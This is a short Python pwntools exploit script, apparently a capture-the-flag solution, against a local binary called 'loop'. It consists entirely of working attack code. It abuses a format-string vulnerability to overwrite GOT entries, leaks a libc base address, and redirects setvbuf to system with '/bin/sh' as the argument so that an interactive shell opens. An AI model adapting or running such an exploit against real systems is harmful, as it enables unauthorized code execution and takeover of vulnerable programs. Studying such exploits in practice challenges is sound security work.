from pwn import *

p = process("./loop")
e = ELF("./loop")
lib = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

def fsb(payload):
    p.sendlineafter("What's your name?", payload)

def overwrite_got(got, val):
    low = val & 0xffff
    middle = (val >> 16) & 0xffff

    target1 = (low, got)
    target2 = (middle, got + 2)

    if low > middle:
        target1, target2 = target2, target1

    payload = f'%{target1[0]}c%16$hn'
    payload += f'%{target2[0] - target1[0]}c%17$hn'
    payload = payload.ljust(32, 'A').encode()
    payload += p64(target1[1]) + p64(target2[1])
    fsb(payload)

# puts_got -> main
payload = f'%{e.sym["main"] & 0xffff}c%15$hn%23$p@@'.ljust(24, 'A').encode()
payload += p64(e.got['puts'])
fsb(payload)

# libc leak
p.recvuntil("0x")
libc_base = int(p.recvuntil('@@')[:-2], 16) - lib.sym['__libc_start_main'] - 243
print(hex(libc_base))

system = libc_base + lib.sym['system']
binsh = libc_base + next(lib.search(b"/bin/sh\x00"))
puts = libc_base + lib.sym['puts']

# setvbuf -> puts
overwrite_got(e.got['setvbuf'], puts)

# stderr -> binsh
overwrite_got(e.got['stderr'], binsh)

# setvbuf -> system
overwrite_got(e.got['setvbuf'], system)

p.interactive()